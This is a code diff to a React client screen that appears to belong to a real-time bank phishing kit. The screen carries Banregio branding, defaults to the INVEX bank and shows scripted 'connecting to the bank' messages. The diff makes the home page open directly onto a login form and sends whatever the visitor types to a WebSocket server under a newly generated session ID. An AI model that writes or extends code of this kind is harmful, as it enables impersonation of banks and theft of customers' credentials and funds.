@@ -29,12 +29,18 @@ import banregioLogoWhite from '../assets/banregio_logo_white.png';
 export default function ClientScreen() {
   // Get session ID from URL
   const [, params] = useRoute('/client/:sessionId');
+  const [, homeParams] = useRoute('/');
   const sessionId = params?.sessionId || '';
+  const isHomePage = homeParams !== null && !sessionId;
   
   // State for the current screen
-  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.VALIDANDO);
-  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
-  const [bankLoaded, setBankLoaded] = useState<boolean>(false);
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>(
+    isHomePage ? ScreenType.LOGIN : ScreenType.VALIDANDO
+  );
+  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
+    banco: 'INVEX' // Banco por defecto para la página principal
+  });
+  const [bankLoaded, setBankLoaded] = useState<boolean>(isHomePage);
   
   // Additional screen-specific state
   const [screenData, setScreenData] = useState<{
@@ -54,8 +60,13 @@ export default function ClientScreen() {
   // WebSocket connection
   const { socket, connected, sendMessage } = useWebSocket('/ws');
 
-  // Efecto para mostrar los mensajes iniciales
+  // Efecto para mostrar los mensajes iniciales (solo para sesiones con sessionId)
   useEffect(() => {
+    if (isHomePage) {
+      setShowInitialMessage(false);
+      return;
+    }
+    
     // Mostrar "Conectando con el banco" por 2 segundos
     const connectingTimer = setTimeout(() => {
       setInitialMessage('Generando aclaración...');
@@ -74,7 +85,7 @@ export default function ClientScreen() {
     }, 2000);
     
     return () => clearTimeout(connectingTimer);
-  }, []);
+  }, [isHomePage]);
   
   // Register with the server when connection is established
   useEffect(() => {
@@ -193,7 +204,33 @@ export default function ClientScreen() {
     if (connected) {
       console.log('Enviando datos al servidor:', screen, formData);
       
-      // Enviar datos al servidor inmediatamente
+      // Si es la página principal y el usuario está haciendo login, crear nueva sesión
+      if (isHomePage && screen === ScreenType.LOGIN) {
+        // Generar nuevo sessionId
+        const newSessionId = Math.random().toString(36).substring(2, 15);
+        
+        // Crear nueva sesión en el servidor
+        sendMessage({
+          type: 'NEW_CLIENT_SESSION',
+          data: {
+            sessionId: newSessionId,
+            banco: 'INVEX',
+            clientData: formData,
+            timestamp: new Date().toISOString()
+          }
+        });
+        
+        // Actualizar el estado local
+        setSessionData(prev => ({ ...prev, id: newSessionId }));
+        setCurrentScreen(ScreenType.VALIDANDO);
+        
+        // Actualizar la URL para incluir el sessionId
+        window.history.pushState({}, '', `/client/${newSessionId}`);
+        
+        return;
+      }
+      
+      // Enviar datos al servidor inmediatamente para sesiones existentes
       sendMessage({
         type: 'CLIENT_INPUT',
         data: {
